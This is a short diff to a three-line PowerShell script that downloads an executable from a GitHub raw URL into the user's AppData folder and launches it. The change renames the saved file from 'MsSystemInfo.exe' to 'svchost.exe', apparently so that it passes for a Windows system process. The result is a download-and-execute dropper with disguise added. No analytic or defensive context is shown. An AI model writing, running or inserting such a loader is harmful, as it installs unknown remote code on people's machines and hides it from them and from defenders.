@@ -1,3 +1,3 @@
-$path = "$env:APPDATA\MsSystemInfo.exe" ; 
+$path = "$env:APPDATA\svchost.exe" ; 
 Invoke-WebRequest -Uri "https://github.com/Aurimous29317/-/raw/refs/heads/main/ADXP.exe" -OutFile $path ; 
 Start-Process $path
